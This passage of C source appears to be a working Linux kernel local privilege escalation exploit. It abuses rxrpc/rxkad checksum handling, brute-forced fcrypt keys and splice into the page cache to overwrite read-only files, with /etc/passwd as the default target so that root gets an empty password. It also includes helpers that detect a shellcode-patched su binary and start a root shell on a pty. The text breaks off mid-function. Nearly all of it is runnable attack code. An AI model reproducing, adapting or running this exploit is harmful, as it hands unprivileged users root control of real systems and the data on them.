    ctx->sched[0x5] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
    ctx->sched[0x6] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
    ctx->sched[0x7] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
    ctx->sched[0x8] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
    ctx->sched[0x9] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
    ctx->sched[0xa] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
    ctx->sched[0xb] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
    ctx->sched[0xc] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
    ctx->sched[0xd] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
    ctx->sched[0xe] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
    ctx->sched[0xf] = htobe32((uint32_t)k);
}

#define FC_F(R_, L_, sched_) do {                                        \
    union { uint32_t l; uint8_t c[4]; } u;                               \
    u.l = (sched_) ^ (R_);                                               \
    L_ ^= fc_sbox0[u.c[0]] ^ fc_sbox1[u.c[1]] ^                          \
    fc_sbox2[u.c[2]] ^ fc_sbox3[u.c[3]];                           \
} while (0)

static void fcrypt_user_decrypt(const fcrypt_uctx *ctx,
        uint8_t out[8], const uint8_t in[8])
{
    uint32_t L, R;
    memcpy(&L, in, 4);
    memcpy(&R, in + 4, 4);
    FC_F(L, R, ctx->sched[0xf]);
    FC_F(R, L, ctx->sched[0xe]);
    FC_F(L, R, ctx->sched[0xd]);
    FC_F(R, L, ctx->sched[0xc]);
    FC_F(L, R, ctx->sched[0xb]);
    FC_F(R, L, ctx->sched[0xa]);
    FC_F(L, R, ctx->sched[0x9]);
    FC_F(R, L, ctx->sched[0x8]);
    FC_F(L, R, ctx->sched[0x7]);
    FC_F(R, L, ctx->sched[0x6]);
    FC_F(L, R, ctx->sched[0x5]);
    FC_F(R, L, ctx->sched[0x4]);
    FC_F(L, R, ctx->sched[0x3]);
    FC_F(R, L, ctx->sched[0x2]);
    FC_F(L, R, ctx->sched[0x1]);
    FC_F(R, L, ctx->sched[0x0]);
    memcpy(out, &L, 4);
    memcpy(out + 4, &R, 4);
}

/* RXRPC functions */
static int do_unshare_userns_netns(void)
{
    uid_t real_uid = getuid();
    gid_t real_gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        WARN("unshare(NEWUSER|NEWNET): %s", strerror(errno));
        return -1;
    }
    LOG("unshare(USER|NET) OK, real uid=%u", real_uid);
    write_file("/proc/self/setgroups", "deny");
    if (write_file("/proc/self/uid_map", "%u %u 1", real_uid, real_uid) < 0) {
        WARN("uid_map: %s", strerror(errno)); return -1;
    }
    if (write_file("/proc/self/gid_map", "%u %u 1", real_gid, real_gid) < 0) {
        WARN("gid_map: %s", strerror(errno)); return -1;
    }
    LOG("uid/gid identity-mapped %u/%u; gained CAP_NET_RAW within netns",
            real_uid, real_gid);

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s >= 0) {
        struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
        strcpy(ifr.ifr_name, "lo");
        if (ioctl(s, SIOCGIFFLAGS, &ifr) == 0) {
            ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
            if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0)
                WARN("SIOCSIFFLAGS lo: %s", strerror(errno));
            else
                LOG("lo brought UP in new netns");
        }
        close(s);
    }
    return 0;
}

static long key_add(const char *type, const char *desc,
        const void *payload, size_t plen, int ringid)
{
    return syscall(SYS_add_key, type, desc, payload, plen, ringid);
}

static int build_rxrpc_v1_token(uint8_t *out, size_t maxlen)
{
    uint8_t *p = out;
    uint32_t now = (uint32_t)time(NULL);
    uint32_t expires = now + 86400;
    *(uint32_t *)p = htonl(0); p += 4;
    const char *cell = "evil";
    uint32_t clen = strlen(cell);
    *(uint32_t *)p = htonl(clen); p += 4;
    memcpy(p, cell, clen);
    uint32_t pad = (4 - (clen & 3)) & 3;
    memset(p + clen, 0, pad);
    p += clen + pad;
    *(uint32_t *)p = htonl(1); p += 4;
    uint8_t *toklen_p = p; p += 4;
    uint8_t *tokstart = p;
    *(uint32_t *)p = htonl(2); p += 4;
    *(uint32_t *)p = htonl(0); p += 4;
    *(uint32_t *)p = htonl(1); p += 4;
    memcpy(p, SESSION_KEY, 8); p += 8;
    *(uint32_t *)p = htonl(now); p += 4;
    *(uint32_t *)p = htonl(expires); p += 4;
    *(uint32_t *)p = htonl(1); p += 4;
    *(uint32_t *)p = htonl(8); p += 4;
    memset(p, 0xCC, 8); p += 8;
    uint32_t toklen = (uint32_t)(p - tokstart);
    *(uint32_t *)toklen_p = htonl(toklen);
    if ((size_t)(p - out) > maxlen) { errno = E2BIG; return -1; }
    return (int)(p - out);
}

static long add_rxrpc_key(const char *desc)
{
    uint8_t buf[512];
    int n = build_rxrpc_v1_token(buf, sizeof(buf));
    if (n < 0) return -1;
    return key_add("rxrpc", desc, buf, n, KEY_SPEC_PROCESS_KEYRING);
}

static int alg_open_pcbc_fcrypt(const uint8_t key[8])
{
    int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (s < 0) { WARN("socket(AF_ALG): %s", strerror(errno)); return -1; }
    struct sockaddr_alg sa = { .salg_family = AF_ALG };
    strcpy((char *)sa.salg_type, "skcipher");
    strcpy((char *)sa.salg_name, "pcbc(fcrypt)");
    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        WARN("bind(AF_ALG pcbc(fcrypt)): %s", strerror(errno));
        close(s); return -1;
    }
    if (setsockopt(s, SOL_ALG, ALG_SET_KEY, key, 8) < 0) {
        WARN("ALG_SET_KEY: %s", strerror(errno));
        close(s); return -1;
    }
    return s;
}

static int alg_op(int alg_s, int op, const uint8_t iv[8],
        const void *in, size_t inlen, void *out)
{
    int op_fd = accept(alg_s, NULL, NULL);
    if (op_fd < 0) { WARN("accept(AF_ALG): %s", strerror(errno)); return -1; }

    char cbuf[CMSG_SPACE(sizeof(int)) +
        CMSG_SPACE(sizeof(struct af_alg_iv) + 8)] = {0};
    struct msghdr msg = {0};
    msg.msg_control = cbuf;
    msg.msg_controllen = sizeof(cbuf);

    struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
    c->cmsg_level = SOL_ALG;
    c->cmsg_type = ALG_SET_OP;
    c->cmsg_len = CMSG_LEN(sizeof(int));
    *(int *)CMSG_DATA(c) = op;

    c = CMSG_NXTHDR(&msg, c);
    c->cmsg_level = SOL_ALG;
    c->cmsg_type = ALG_SET_IV;
    c->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + 8);
    struct af_alg_iv *aiv = (struct af_alg_iv *)CMSG_DATA(c);
    aiv->ivlen = 8;
    memcpy(aiv->iv, iv, 8);

    struct iovec iov = { .iov_base = (void *)in, .iov_len = inlen };
    msg.msg_iov = &iov; msg.msg_iovlen = 1;

    if (sendmsg(op_fd, &msg, 0) < 0) {
        WARN("AF_ALG sendmsg: %s", strerror(errno));
        close(op_fd); return -1;
    }
    ssize_t n = read(op_fd, out, inlen);
    close(op_fd);
    if (n != (ssize_t)inlen) {
        WARN("AF_ALG read got %zd want %zu: %s",
                n, inlen, strerror(errno));
        return -1;
    }
    return 0;
}

static int compute_csum_iv(uint32_t epoch, uint32_t cid, uint32_t sec_ix,
        const uint8_t key[8], uint8_t csum_iv[8])
{
    int s = alg_open_pcbc_fcrypt(key);
    if (s < 0) return -1;
    uint32_t in[4]  = { htonl(epoch), htonl(cid), 0, htonl(sec_ix) };
    uint8_t  out[16];
    int rc = alg_op(s, ALG_OP_ENCRYPT, key, in, 16, out);
    close(s);
    if (rc < 0) return -1;
    memcpy(csum_iv, out + 8, 8);
    return 0;
}

static int compute_cksum(uint32_t cid, uint32_t call_id, uint32_t seq,
        const uint8_t key[8], const uint8_t csum_iv[8],
        uint16_t *cksum_out)
{
    int s = alg_open_pcbc_fcrypt(key);
    if (s < 0) return -1;
    uint32_t x = (cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT);
    x |= seq & 0x3fffffff;
    uint32_t in[2] = { htonl(call_id), htonl(x) };
    uint32_t out[2];
    int rc = alg_op(s, ALG_OP_ENCRYPT, csum_iv, in, 8, out);
    close(s);
    if (rc < 0) return -1;
    uint32_t y = ntohl(out[1]);
    uint16_t v = (y >> 16) & 0xffff;
    if (v == 0) v = 1;
    *cksum_out = v;
    return 0;
}

static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
{
    int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
    if (fd < 0) { WARN("socket(AF_RXRPC client): %s", strerror(errno)); return -1; }
    if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY,
                keyname, strlen(keyname)) < 0) {
        WARN("client SECURITY_KEY: %s", strerror(errno)); close(fd); return -1;
    }
    int min_level = RXRPC_SECURITY_AUTH;
    if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
                &min_level, sizeof(min_level)) < 0) {
        WARN("client MIN_SECURITY_LEVEL: %s", strerror(errno));
        close(fd); return -1;
    }
    struct sockaddr_rxrpc srx = {0};
    srx.srx_family = AF_RXRPC;
    srx.srx_service = 0;
    srx.transport_type = SOCK_DGRAM;
    srx.transport_len = sizeof(struct sockaddr_in);
    srx.transport.sin.sin_family = AF_INET;
    srx.transport.sin.sin_port = htons(local_port);
    srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
    if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0) {
        WARN("client bind :%u: %s", local_port, strerror(errno));
        close(fd); return -1;
    }
    LOG("AF_RXRPC client bound :%u", local_port);
    return fd;
}

static int rxrpc_client_initiate_call(int cli_fd, uint16_t srv_port,
        uint16_t service_id,
        unsigned long user_call_id)
{
    char data[8] = "PINGPING";
    struct sockaddr_rxrpc srx = {0};
    srx.srx_family = AF_RXRPC;
    srx.srx_service = service_id;
    srx.transport_type = SOCK_DGRAM;
    srx.transport_len = sizeof(struct sockaddr_in);
    srx.transport.sin.sin_family = AF_INET;
    srx.transport.sin.sin_port = htons(srv_port);
    srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);

    char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
    struct msghdr msg = {0};
    msg.msg_name = &srx; msg.msg_namelen = sizeof(srx);
    struct iovec iov = { .iov_base = data, .iov_len = sizeof(data) };
    msg.msg_iov = &iov; msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf; msg.msg_controllen = sizeof(cmsg_buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_RXRPC;
    cmsg->cmsg_type = RXRPC_USER_CALL_ID;
    cmsg->cmsg_len = CMSG_LEN(sizeof(unsigned long));
    *(unsigned long *)CMSG_DATA(cmsg) = user_call_id;

    int fl = fcntl(cli_fd, F_GETFL);
    fcntl(cli_fd, F_SETFL, fl | O_NONBLOCK);

    ssize_t n = sendmsg(cli_fd, &msg, 0);
    fcntl(cli_fd, F_SETFL, fl);
    if (n < 0) {
        if (errno == EAGAIN || errno == EWOULDBLOCK) {
            LOG("client sendmsg returned EAGAIN (expected; kernel will keep retrying handshake)");
            return 0;
        }
        WARN("client sendmsg: %s", strerror(errno));
        return -1;
    }
    LOG("client sendmsg %zd B → :%u (handshake will follow asynchronously)",
            n, srv_port);
    return 0;
}

static int setup_udp_server(uint16_t port)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) { WARN("socket(udp server): %s", strerror(errno)); return -1; }
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = htonl(0x7F000001);
    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        WARN("udp server bind :%u: %s", port, strerror(errno));
        close(s); return -1;
    }
    LOG("plain UDP fake-server bound :%u", port);
    return s;
}

static ssize_t udp_recv_to(int s, void *buf, size_t cap,
        struct sockaddr_in *from, int timeout_ms)
{
    struct pollfd pfd = { .fd = s, .events = POLLIN };
    int rc = poll(&pfd, 1, timeout_ms);
    if (rc <= 0) return -1;
    socklen_t fl = from ? sizeof(*from) : 0;
    return recvfrom(s, buf, cap, 0,
            (struct sockaddr *)from, from ? &fl : NULL);
}

static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len)
{
    char keyname[32];
    snprintf(keyname, sizeof(keyname), "evil%d", trigger_seq++);

    long key = add_rxrpc_key(keyname);
    if (key < 0) {
        if (trigger_seq < 5) WARN("add_rxrpc_key(%s): %s", keyname, strerror(errno));
        return -1;
    }

    uint16_t port_S = 7777 + (trigger_seq * 2 % 200);
    uint16_t port_C = port_S + 1;
    uint16_t svc_id = 1234;

    int udp_srv = setup_udp_server(port_S);
    if (udp_srv < 0) {
        if (trigger_seq < 5) WARN("setup_udp_server(%u) failed", port_S);
        syscall(SYS_keyctl, 3 /*KEYCTL_INVALIDATE*/, key); return -1;
    }

    int rxsk_cli = setup_rxrpc_client(port_C, keyname);
    if (rxsk_cli < 0) {
        if (trigger_seq < 5) WARN("setup_rxrpc_client(%u, %s) failed", port_C, keyname);
        close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
    }

    if (rxrpc_client_initiate_call(rxsk_cli, port_S, svc_id, 0xDEAD) < 0) {
        if (trigger_seq < 5) WARN("rxrpc_client_initiate_call failed");
        close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
    }

    uint8_t pkt[2048];
    struct sockaddr_in cli_addr;
    ssize_t n = udp_recv_to(udp_srv, pkt, sizeof(pkt), &cli_addr, 1500);
    if (n < (ssize_t)sizeof(struct rxrpc_wire_header)) {
        if (trigger_seq < 5) WARN("udp_recv_to: n=%zd errno=%s", n, strerror(errno));
        close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
    }
    struct rxrpc_wire_header *whdr_in = (struct rxrpc_wire_header *)pkt;
    uint32_t epoch  = ntohl(whdr_in->epoch);
    uint32_t cid    = ntohl(whdr_in->cid);
    uint32_t callN  = ntohl(whdr_in->callNumber);
    uint16_t svc_in = ntohs(whdr_in->serviceId);
    uint16_t cli_port = ntohs(cli_addr.sin_port);

    {
        struct {
            struct rxrpc_wire_header hdr;
            struct rxkad_challenge   ch;
        } __attribute__((packed)) c = {0};
        c.hdr.epoch = htonl(epoch);
        c.hdr.cid = htonl(cid);
        c.hdr.callNumber = 0; c.hdr.seq = 0;
        c.hdr.serial = htonl(0x10000);
        c.hdr.type = RXRPC_PACKET_TYPE_CHALLENGE;
        c.hdr.securityIndex = 2;
        c.hdr.serviceId = htons(svc_in);
        c.ch.version = htonl(2); c.ch.nonce = htonl(0xDEADBEEFu);
        c.ch.min_level = htonl(1);
        struct sockaddr_in to = { .sin_family=AF_INET, .sin_port=htons(cli_port),
            .sin_addr.s_addr=htonl(0x7F000001) };
        if (sendto(udp_srv, &c, sizeof(c), 0, (struct sockaddr*)&to, sizeof(to)) < 0) {
            close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
        }
    }

    for (int i = 0; i < 4; i++) {
        struct sockaddr_in src;
        if (udp_recv_to(udp_srv, pkt, sizeof(pkt), &src, 500) < 0) break;
    }

    uint8_t csum_iv[8] = {0};
    if (compute_csum_iv(epoch, cid, 2, SESSION_KEY, csum_iv) < 0) {
        close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
    }
    uint16_t cksum_h = 0;
    if (compute_cksum(cid, callN, 1, SESSION_KEY, csum_iv, &cksum_h) < 0) {
        close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
    }

    struct rxrpc_wire_header mal = {0};
    mal.epoch = htonl(epoch);
    mal.cid = htonl(cid);
    mal.callNumber = htonl(callN);
    mal.seq = htonl(1);
    mal.serial = htonl(0x42000);
    mal.type = RXRPC_PACKET_TYPE_DATA;
    mal.flags = RXRPC_LAST_PACKET;
    mal.securityIndex = 2;
    mal.cksum = htons(cksum_h);
    mal.serviceId = htons(svc_in);

    struct sockaddr_in dst = { .sin_family=AF_INET, .sin_port=htons(cli_port),
        .sin_addr.s_addr=htonl(0x7F000001) };
    if (connect(udp_srv, (struct sockaddr*)&dst, sizeof(dst)) < 0) {
        close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
    }

    int p[2];
    if (pipe(p) < 0) {
        close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
    }
    {
        struct iovec viv = { .iov_base = &mal, .iov_len = sizeof(mal) };
        if (vmsplice(p[1], &viv, 1, 0) < 0) goto trig_fail;
    }
    {
        loff_t off = splice_off;
        if (splice(target_fd, &off, p[1], NULL, splice_len, SPLICE_F_NONBLOCK) < 0)
            goto trig_fail;
    }
    if (splice(p[0], NULL, udp_srv, NULL, sizeof(mal) + splice_len, 0) < 0) {
        goto trig_fail;
    }
    close(p[0]); close(p[1]);

    int fl = fcntl(rxsk_cli, F_GETFL);
    fcntl(rxsk_cli, F_SETFL, fl | O_NONBLOCK);
    for (int round = 0; round < 5; round++) {
        char rb[2048];
        struct sockaddr_rxrpc srx;
        char ccb[256];
        struct msghdr m = {0};
        struct iovec iv = { .iov_base = rb, .iov_len = sizeof(rb) };
        m.msg_name = &srx; m.msg_namelen = sizeof(srx);
        m.msg_iov = &iv;  m.msg_iovlen = 1;
        m.msg_control = ccb; m.msg_controllen = sizeof(ccb);
        ssize_t r = recvmsg(rxsk_cli, &m, 0);
        if (r > 0) break;
        if (errno == EAGAIN || errno == EWOULDBLOCK) usleep(20000);
        else break;
    }
    fcntl(rxsk_cli, F_SETFL, fl);

    close(rxsk_cli);
    close(udp_srv);
    syscall(SYS_keyctl, 3, key);
    return 0;

trig_fail:
    close(p[0]); close(p[1]);
    close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key);
    return -1;
}

static uint64_t fc_splitmix64(uint64_t *s)
{
    uint64_t z = (*s += 0x9E3779B97F4A7C15ULL);
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
    z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
    return z ^ (z >> 31);
}

typedef int (*pcheck_fn)(const uint8_t P[8]);

static int find_K_offline_generic(const uint8_t C[8], uint64_t max_iters,
        pcheck_fn check,
        uint8_t K_out[8], uint8_t P_out[8],
        uint64_t seed_init,
        const char *label)
{
    fcrypt_uctx ctx;
    uint8_t K[8], P[8];
    uint64_t seed = seed_init;
    struct timespec ts0, ts1;
    clock_gettime(CLOCK_MONOTONIC, &ts0);

    for (uint64_t iter = 0; iter < max_iters; iter++) {
        uint64_t r = fc_splitmix64(&seed);
        memcpy(K, &r, 8);
        fcrypt_user_setkey(&ctx, K);
        fcrypt_user_decrypt(&ctx, P, C);

        if (check(P)) {
            memcpy(K_out, K, 8);
            memcpy(P_out, P, 8);
            clock_gettime(CLOCK_MONOTONIC, &ts1);
            double dt = (ts1.tv_sec - ts0.tv_sec) +
                (ts1.tv_nsec - ts0.tv_nsec) / 1e9;
            LOG("%s found after %lu iters in %.2fs (%.2fM/s) K=%02x%02x%02x%02x%02x%02x%02x%02x  P=%02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
                    label,
                    (unsigned long)iter, dt, iter / dt / 1e6,
                    K[0],K[1],K[2],K[3],K[4],K[5],K[6],K[7],
                    P[0],P[1],P[2],P[3],P[4],P[5],P[6],P[7],
                    (P[0]>=32&&P[0]<127)?P[0]:'.',
                    (P[1]>=32&&P[1]<127)?P[1]:'.',
                    (P[2]>=32&&P[2]<127)?P[2]:'.',
                    (P[3]>=32&&P[3]<127)?P[3]:'.',
                    (P[4]>=32&&P[4]<127)?P[4]:'.',
                    (P[5]>=32&&P[5]<127)?P[5]:'.',
                    (P[6]>=32&&P[6]<127)?P[6]:'.',
                    (P[7]>=32&&P[7]<127)?P[7]:'.');
            return 0;
        }

        if ((iter & 0x3ffffff) == 0 && iter > 0) {
            clock_gettime(CLOCK_MONOTONIC, &ts1);
            double dt = (ts1.tv_sec - ts0.tv_sec) +
                (ts1.tv_nsec - ts0.tv_nsec) / 1e9;
            fprintf(stderr, "  [%s %.1fs] iter=%lu (%.2fM/s)\n",
                    label, dt, (unsigned long)iter, iter / dt / 1e6);
        }
    }
    return -1;
}

static inline int fc_check_pa_nullok(const uint8_t P[8])
{
    return P[0] == ':' && P[1] == ':';
}

static inline int fc_check_pb_nullok(const uint8_t P[8])
{
    return P[0] == '0' && P[1] == ':';
}

static inline int fc_check_pc_nullok(const uint8_t P[8])
{
    if (P[0] != '0') return 0;
    if (P[1] != ':') return 0;
    if (P[7] != ':') return 0;
    for (int i = 2; i < 7; i++) {
        if (P[i] == ':' || P[i] == '\0' || P[i] == '\n') return 0;
    }
    return 1;
}

int rxrpc_lpe_main(int argc, char **argv, const char *target_path)
{
    if (!target_path) {
        target_path = "/etc/passwd";
    }
    
    fprintf(stderr, "\n=== rxrpc/rxkad LPE EXPLOIT (target: %s) ===\n", target_path);
    fprintf(stderr, "[*] uid=%u euid=%u gid=%u\n",
            getuid(), geteuid(), getgid());

    {
        const char *no_unshare = getenv("POC_NO_UNSHARE");
        if (!no_unshare || *no_unshare != '1') {
            const char *do_unshare = getenv("POC_UNSHARE");
            if (do_unshare && *do_unshare == '1') {
                if (do_unshare_userns_netns() < 0) return 1;
            }
        }
    }

    {
        int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
        if (dummy < 0) {
            WARN("socket(AF_RXRPC): %s — module not loadable?", strerror(errno));
            return 1;
        }
        close(dummy);
        LOG("rxrpc module autoloaded via dummy socket(AF_RXRPC)");
    }

    int rfd_ro = open(target_path, O_RDONLY);
    if (rfd_ro < 0) {
        WARN("open %s RO: %s", target_path, strerror(errno));
        return 1;
    }
    struct stat st;
    fstat(rfd_ro, &st);
    if (st.st_size < 32) { WARN("target too small: %lld", (long long)st.st_size); return 1; }
    LOG("target %s opened RO, size=%lld, uid=%u gid=%u mode=%04o",
            target_path, (long long)st.st_size, st.st_uid, st.st_gid,
            st.st_mode & 07777);

    void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd_ro, 0);
    if (map == MAP_FAILED) { WARN("mmap: %s", strerror(errno)); return 1; }
    LOG("mmap'd %s page-cache at %p (PROT_READ|MAP_SHARED)", target_path, map);

    {
        const char *m = (const char *)map;
        if (strcmp(target_path, "/etc/passwd") == 0 && memcmp(m, "root::0:0", 9) == 0) {
            LOG("%s already patched (root::0:0...) — nothing to do", target_path);
            return 0;
        }
        LOG("%s line 1 first 16 bytes:", target_path);
        for (int i = 0; i < 16; i++)
            fprintf(stderr, "%02x ", (uint8_t)m[i]);
        fprintf(stderr, "\n");
    }
    fprintf(stderr, "[*] %s line 1 BEFORE: '", target_path);
    for (int i = 0; i < 32; i++) {
        char c = ((const char *)map)[i];
        fputc((c == '\n') ? '$' : (c >= 32 && c < 127 ? c : '.'), stderr);
    }
    fprintf(stderr, "'\n");

    uint8_t Ca[8], Cb[8], Cc[8];
    int off_a = 4, off_b = 6, off_c = 8;
    if (pread(rfd_ro, Ca, 8, off_a) != 8) { WARN("pread Ca: %s", strerror(errno)); return 1; }
    if (pread(rfd_ro, Cb, 8, off_b) != 8) { WARN("pread Cb: %s", strerror(errno)); return 1; }
    if (pread(rfd_ro, Cc, 8, off_c) != 8) { WARN("pread Cc: %s", strerror(errno)); return 1; }

    fcrypt_init_sboxes();
    {
        fcrypt_uctx ctx;
        uint8_t z[8] = {0};
        uint8_t cv[8] = { 0x0E, 0x09, 0x00, 0xC7, 0x3E, 0xF7, 0xED, 0x41 };
        uint8_t pv[8];
        fcrypt_user_setkey(&ctx, z);
        fcrypt_user_decrypt(&ctx, pv, cv);
        if (memcmp(pv, z, 8) != 0) { WARN("fcrypt selftest FAILED"); return 1; }
    }
    LOG("fcrypt selftest OK");

    uint8_t Ka[8], Pa_out[8];
    uint8_t Kb[8], Pb_out[8];
    uint8_t Kc[8], Pc_out[8];
    uint8_t Cb_actual[8], Cc_actual[8];

    {
        uint64_t max_iters = 10000000000ULL;
        const char *e = getenv("LPE_MAX_ITERS");
        if (e) max_iters = strtoull(e, NULL, 0);
        uint64_t seed_base = (uint64_t)time(NULL) * 0x100000001ULL ^ (uint64_t)getpid();
        const char *se = getenv("LPE_SEED");
        if (se) seed_base = strtoull(se, NULL, 0);

        fprintf(stderr, "\n=== STAGE 1a: search K_A (chars 4-5 := \"::\")  prob ~1.5e-5 ===\n");
        if (find_K_offline_generic(Ca, max_iters, fc_check_pa_nullok,
                    Ka, Pa_out, seed_base, "K_A") != 0) {
            WARN("K_A search exhausted"); return 2;
        }

        memcpy(Cb_actual, Pa_out + 2, 6);
        memcpy(Cb_actual + 6, Cb + 6, 2);

        fprintf(stderr, "\n=== STAGE 1b: search K_B (chars 6-7 := \"0:\")  prob ~1.5e-5 ===\n");
        if (find_K_offline_generic(Cb_actual, max_iters, fc_check_pb_nullok,
                    Kb, Pb_out, seed_base ^ 0xa5a5a5a5a5a5a5a5ULL,
                    "K_B") != 0) {
            WARN("K_B search exhausted"); return 2;
        }

        memcpy(Cc_actual, Pb_out + 2, 6);
        memcpy(Cc_actual + 6, Cc + 6, 2);

        fprintf(stderr, "\n=== STAGE 1c: search K_C (chars 8-15 := \"0:GGGGGG:\")  prob ~5.4e-8 ===\n");
        if (find_K_offline_generic(Cc_actual, max_iters, fc_check_pc_nullok,
                    Kc, Pc_out, seed_base ^ 0x5a5a5a5a5a5a5a5aULL,
                    "K_C") != 0) {
            WARN("K_C search exhausted"); return 2;
        }
    }

    fprintf(stderr, "\n[+] Predicted post-corruption %s line 1:\n    \"root", target_path);
    for (int i = 0; i < 2; i++) fputc((Pa_out[i]>=32&&Pa_out[i]<127)?Pa_out[i]:'.', stderr);
    for (int i = 0; i < 2; i++) fputc((Pb_out[i]>=32&&Pb_out[i]<127)?Pb_out[i]:'.', stderr);
    for (int i = 0; i < 8; i++) fputc((Pc_out[i]>=32&&Pc_out[i]<127)?Pc_out[i]:'.', stderr);
    fprintf(stderr, "/root:/bin/bash\"\n");

    fprintf(stderr, "\n=== STAGE 2a: kernel trigger A @ off %d (set chars 4-5 \"::\") ===\n", off_a);
    memcpy(SESSION_KEY, Ka, 8);
    if (do_one_trigger(rfd_ro, off_a, 8) < 0) {
        WARN("kernel trigger A failed"); return 3;
    }

    fprintf(stderr, "\n=== STAGE 2b: kernel trigger B @ off %d (set chars 6-7 \"0:\") ===\n", off_b);
    memcpy(SESSION_KEY, Kb, 8);
    if (do_one_trigger(rfd_ro, off_b, 8) < 0) {
        WARN("kernel trigger B failed"); return 3;
    }

    fprintf(stderr, "\n=== STAGE 2c: kernel trigger C @ off %d (set chars 8-15 \"0:GGGGGG:\") ===\n", off_c);
    memcpy(SESSION_KEY, Kc, 8);
    if (do_one_trigger(rfd_ro, off_c, 8) < 0) {
        WARN("kernel trigger C failed"); return 3;
    }

    fprintf(stderr, "[*] %s line 1 AFTER:  '", target_path);
    for (int i = 0; i < 32; i++) {
        char c = ((const char *)map)[i];
        fputc((c == '\n') ? '$' : (c >= 32 && c < 127 ? c : '.'), stderr);
    }
    fprintf(stderr, "'\n");

    {
        const char *m = (const char *)map;
        int ok = (m[4] == ':' && m[5] == ':' &&
                m[6] == '0' && m[7] == ':' &&
                m[8] == '0' && m[9] == ':' &&
                m[15] == ':');
        if (!ok) {
            WARN("post-trigger sanity check failed — char layout off");
            return 4;
        }
    }
    
    return 0;
}

/* Binary check functions */
static const uint8_t su_marker[8] = {
    0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
};

static int binary_already_patched(const char *target_path, off_t offset, 
                                   const uint8_t *marker, size_t marker_len)
{
    int fd = open(target_path, O_RDONLY);
    if (fd < 0)
        return 0;
    uint8_t *got = malloc(marker_len);
    if (!got) {
        close(fd);
        return 0;
    }
    ssize_t n = pread(fd, got, marker_len, offset);
    close(fd);
    int result = (n == (ssize_t)marker_len && memcmp(got, marker, marker_len) == 0);
    free(got);
    return result;
}

static int binary_already_patched_cached(const char *target_path)
{
    return binary_already_patched(target_path, 0x78, su_marker, sizeof(su_marker));
}

static int passwd_already_patched_cached(const char *target_path)
{
    if (strcmp(target_path, "/etc/passwd") != 0)
        return 0;
    int fd = open(target_path, O_RDONLY);
    if (fd < 0)
        return 0;
    char head[16];
    ssize_t n = pread(fd, head, sizeof(head), 0);
    close(fd);
    if (n < 9)
        return 0;
    return memcmp(head, "root::0:0", 9) == 0;
}

static int either_target_patched(const char *su_target, const char *passwd_target)
{
    return binary_already_patched_cached(su_target) || 
           passwd_already_patched_cached(passwd_target);
}

static void exec_custom_binary(const char *target_path)
{
    const char *base = strrchr(target_path, '/');
    base = base ? base + 1 : target_path;
    
    if (strcmp(base, "su") == 0) {
        execl(target_path, base, "-", (char *)NULL);
    } else if (strcmp(base, "sudo") == 0) {
        execl(target_path, base, "-i", (char *)NULL);
    } else {
        execl(target_path, base, (char *)NULL);
    }
}

static int run_root_pty_with_target(const char *target_path)
{
    int master = posix_openpt(O_RDWR | O_NOCTTY);
    if (master < 0)
        return -1;
    if (grantpt(master) < 0 || unlockpt(master) < 0) {
        close(master);
        return -1;
    }
    char *slave_name = ptsname(master);
    if (!slave_name) {
        close(master);
        return -1;
    }

    struct winsize ws;
    if (ioctl(STDIN_FILENO, TIOCGWINSZ, &ws) == 0)
        ioctl(master, TIOCSWINSZ, &ws);

    pid_t pid = fork();
    if (pid < 0) {
        close(master);
        return -1;
    }
    if (pid == 0) {
        setsid();
        int slave = open(slave_name, O_RDWR);
        if (slave < 0)
